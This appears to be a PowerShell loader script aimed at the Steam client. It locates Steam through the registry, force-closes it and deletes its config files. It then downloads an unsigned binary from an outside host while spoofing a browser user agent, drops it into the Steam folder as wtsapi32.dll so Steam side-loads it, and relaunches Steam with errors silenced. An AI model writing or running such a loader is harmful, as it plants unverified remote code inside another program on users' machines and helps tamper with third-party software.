& {
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'

function Fail($msg) {
    exit 1
}

function CloseSteam {
    if (-not (Get-Process -Name steam -EA SilentlyContinue)) { return }
    $steamExe = Join-Path $steamPath 'steam.exe'
    if (Test-Path $steamExe) { Start-Process $steamExe -ArgumentList '-shutdown' -EA SilentlyContinue }
    for ($i = 0; $i -lt 15; $i++) {
        if (-not (Get-Process -Name steam -EA SilentlyContinue)) { break }
        Start-Sleep 1
    }
    Get-Process -Name steam,steamwebhelper,steamservice -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 2
    if (Get-Process -Name steam -EA SilentlyContinue) { Fail 'Could not close Steam.' }
}

$steamPath = $null
foreach ($reg in @('HKCU:\Software\Valve\Steam','HKLM:\Software\Valve\Steam','HKLM:\Software\WOW6432Node\Valve\Steam')) {
    $p = (Get-ItemProperty -Path $reg -EA SilentlyContinue).SteamPath
    if ($p -and (Test-Path ($p -replace '/','\'))){ $steamPath = $p -replace '/','\\'; break }
}
if (-not $steamPath) { Fail 'Steam not found' }

$steamExe = Join-Path $steamPath 'steam.exe'
try {
    $bytes = [System.IO.File]::ReadAllBytes($steamExe)
    $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
    $machine = [BitConverter]::ToUInt16($bytes, $peOffset + 4)
    if ($machine -ne 0x8664) {
        Remove-Item (Join-Path $steamPath 'steam.cfg') -Force -EA SilentlyContinue
        Remove-Item (Join-Path $steamPath 'package\beta') -Force -Recurse -EA SilentlyContinue
        CloseSteam
        Start-Process (Join-Path $steamPath 'steam.exe')
        exit
    }
} catch {
    Fail "Could not verify Steam."
}

$dest = Join-Path $steamPath 'wtsapi32.dll'
$cleanup = @(
    (Join-Path $steamPath 'version.dll'),
    (Join-Path $steamPath 'config\manifests.dll'),
    (Join-Path $steamPath 'config\.mfx_init'),
    (Join-Path $steamPath 'config\.stfix_init')
)
$needsUpdate = $true

if (Test-Path $dest) {
    try {
        $req = [System.Net.HttpWebRequest]::Create('https://r2.steamproof.net/update')
        $req.Method = 'HEAD'
        $req.UserAgent = $UA
        $resp = $req.GetResponse()
        $remoteEtag = $resp.Headers['ETag'] -replace '"',''
        $resp.Close()
        $localHash = (Get-FileHash $dest -Algorithm MD5).Hash.ToLower()
        if ($remoteEtag -and $localHash -eq $remoteEtag) {
            $needsUpdate = $false
        }
    } catch {}
}

if ($needsUpdate) {
    CloseSteam
    $cleanup | ForEach-Object { Remove-Item $_ -Force -EA SilentlyContinue }
    Remove-Item $dest -Force -EA SilentlyContinue
    try {
        $req = [System.Net.HttpWebRequest]::Create('https://r2.steamproof.net/update')
        $req.UserAgent = $UA
        $resp = $req.GetResponse()
        $total = $resp.ContentLength
        $stream = $resp.GetResponseStream()
        $fs = [System.IO.File]::Create($dest)
        $buf = New-Object byte[] 65536
        $dl = 0
        while (($n = $stream.Read($buf, 0, $buf.Length)) -gt 0) {
            $fs.Write($buf, 0, $n); $dl += $n
        }
        $fs.Close(); $stream.Close(); $resp.Close()
    } catch {
        Fail "Download failed."
    }
    if (-not (Test-Path $dest)) { Fail 'File was not saved' }
}

Start-Process (Join-Path $steamPath 'steam.exe')
exit
}

